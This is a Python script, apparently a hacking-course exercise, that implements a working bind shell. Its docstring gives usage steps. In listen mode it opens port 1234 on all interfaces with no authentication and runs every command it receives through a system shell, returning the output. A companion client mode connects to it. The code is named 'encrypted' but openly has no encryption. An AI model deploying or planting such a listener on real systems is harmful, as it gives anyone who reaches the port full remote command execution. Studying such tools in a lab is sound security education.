'''run these commands in the vscode terminal:-

        python3 ebs.py -h (for help)
        python3 ebs.py -l (for starting bind shell and listning)



after that open a terminal and cd to this directory(/home/gaurav/codes/python for hackers/python 201/Python Projects/encrypted bind shell)
and run this code using below commands:-

        python3 ebs.py -c 127.0.0.1                         

(this will connect attacker(terminal) and server(vscode terminal) and we can run commands through attacker(terminal) on server(vscode terminal))
hence thsese commands are being executed by this bind shell 

this blind shell dont have encryption


Note : while  Burp extension (extending burp)  is running in burpsuite this code will show ip address busy 
so reload the burp extension and run this code first and then try to connect using burpextension
'''



import socket, subprocess, threading,argparse



DEFAULT_PORT = 1234
MAX_BUFFER = 4096


def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode()
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    

    try:
        s.send(b"[ -- Connected! --]")
        
        while True:
            s.send(b"\r\nEnter Command>")

            data = s.recv(MAX_BUFFER)
            if data :
                buffer = decode_and_strip(data)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing command: '{}' ".format(buffer))
            s.send(execute_cmd(buffer))

    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            s.send(data.encode("latin-1"))

    except:
        s.close()
        exit()

def recv_thread(s):
    try :
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                print("\n" + data, end="", flush=True)

    except:
        s.close()
        exit()


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[ -- Starting bind shell! --]")
    while True:
        client_socket , addr = s.accept()
        print("[ -- New user connected! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()



def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting bind shell! -- ]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()



parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)

parser.add_argument("-c", "--connect", help="connect to a bind shell", required=False )

args = parser.parse_args()

if args.listen:
    server()
elif args.connect:
    client(args.connect)


#print(execute_cmd("whoami"))

